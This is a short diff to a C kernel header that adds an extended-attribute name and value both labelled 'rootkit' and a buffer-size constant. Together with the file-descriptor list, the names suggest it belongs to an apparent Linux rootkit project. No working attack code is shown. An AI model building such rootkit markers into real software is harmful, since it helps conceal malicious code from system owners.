@@ -4,6 +4,10 @@
 #include <linux/types.h>
 
 #define FD_FROM_NAME(name) ((int)simple_strtol((name), NULL, 10))
+#define G7_XATTR_NAME "user.rootkit"
+#define G7_XATTR_VAL  "rootkit"
+
+#define BUFLEN 512
 
 typedef struct fd_list *fd_list_t_ptr;
 typedef struct fd_list {
